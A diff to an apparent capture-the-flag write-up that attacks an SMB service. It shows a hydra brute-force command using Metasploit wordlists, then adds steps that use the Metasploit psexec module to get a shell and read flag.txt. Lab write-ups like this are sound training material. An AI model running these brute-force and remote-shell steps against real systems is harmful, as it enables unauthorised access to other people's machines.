@@ -62,3 +62,9 @@ you will get flag
 bruteforce using the hydra
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://url
 
+use can also you one more metasploit framework
+use exploit/windows/smb/psexec
+set username & password then you get the shell
+ls
+dir C:\
+type flag.txt to print
